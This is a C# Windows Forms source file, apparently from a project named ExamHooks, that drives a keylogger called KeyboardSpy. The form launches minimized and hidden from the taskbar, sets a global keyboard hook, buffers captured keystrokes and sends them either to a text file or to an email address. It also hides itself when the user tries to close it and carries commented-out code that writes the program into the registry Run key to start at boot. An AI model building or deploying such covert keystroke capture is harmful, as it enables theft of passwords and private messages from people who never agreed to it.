using ExamHooks.Interfaces;
using ExamHooks.Methods;
using ExamHooks.Modules;
using System;
using System.Collections.Generic;
using System.ComponentModel;
using System.Data;
using System.Drawing;
using System.IO;
using System.Linq;
using System.Runtime.InteropServices;
using System.Text;
using System.Threading.Tasks;
using System.Windows.Forms;

namespace ExamHooks
{
    public partial class Form1 : Form
    {
        private KeyboardSpy keyboardSpy;
        private string filePath;

        public Form1()
        {
            InitializeComponent();
           
            this.WindowState = FormWindowState.Minimized;
            this.ShowInTaskbar = false;
            NotifyIconSettings();

            keyboardSpy = new KeyboardSpy();
            keyboardSpy.SizeBufer = (int)numUD.Value;
            tbSetText.DataBindings.Add(nameof(tbSetText.Text), keyboardSpy, nameof(keyboardSpy.KeysStr));            
        }

        private void NotifyIconSettings()
        {
            notifyIcon1.Icon = Properties.Resources.Custom_Icon;
            notifyIcon1.Click += NotifyIcon1_Click;
            notifyIcon1.BalloonTipIcon = ToolTipIcon.Info;
            notifyIcon1.BalloonTipTitle = "Подсказка";

            MenuItem menuItem = new MenuItem("Close",
                (object sender, EventArgs e) =>
                {
                    Application.Exit();
                });
            ContextMenu contextMenu = new ContextMenu();
            contextMenu.MenuItems.Add(menuItem);
            notifyIcon1.ContextMenu = contextMenu;
        }

        private void NotifyIcon1_Click(object sender, EventArgs e)
        {
            this.WindowState = FormWindowState.Normal;
            this.Visible = true;
        }

        private void Form1_FormClosing(object sender, FormClosingEventArgs e)
        {
            if (e.CloseReason == CloseReason.UserClosing)
            {
                this.Visible = false;
                e.Cancel = true;
            }
            else
            {
                keyboardSpy.SendData();
                keyboardSpy.UnHook();
            }
        }

        private void notifyIcon1_MouseDoubleClick(object sender, MouseEventArgs e)
        {

        }

        private void numUD_ValueChanged(object sender, EventArgs e)
        {
            keyboardSpy.SizeBufer = (int)numUD.Value;
        }

        private void cbNotifyIcon_CheckedChanged(object sender, EventArgs e)
        {

            notifyIcon1.Visible = !notifyIcon1.Visible;

        }

        private void cbAutoRun_CheckedChanged(object sender, EventArgs e)
        {
            //var key = Microsoft.Win32.Registry.LocalMachine.OpenSubKey(@"SOFTWARE\Microsoft\Windows\CurrentVersion\Run\", true);
            //key.SetValue("KeySpy", Application.ExecutablePath);
        }

        private void bSetFilePath_Click(object sender, EventArgs e)
        {
            SaveFileDialog saveFileDialog = new SaveFileDialog();
            saveFileDialog.Filter= "Text (*.txt)|*.txt";
            if (saveFileDialog.ShowDialog()==DialogResult.OK)
            {
                filePath = saveFileDialog.FileName;
                tbFilePath.Text = filePath;
            }
        }

        private void rbWriteToFile_CheckedChanged(object sender, EventArgs e)
        {
            if(filePath!=null)
            {
                keyboardSpy.Sender = new FileWriter(filePath);
            }
        }

        private void rbSendToEmail_CheckedChanged(object sender, EventArgs e)
        {
            if(tbEmail.Text!=null)
            {
                keyboardSpy.Sender = new EmailSender(tbEmail.Text);
            }
        }

        private void bSetHook_Click(object sender, EventArgs e)
        { 
            keyboardSpy.SetHook();
        }
    }
}
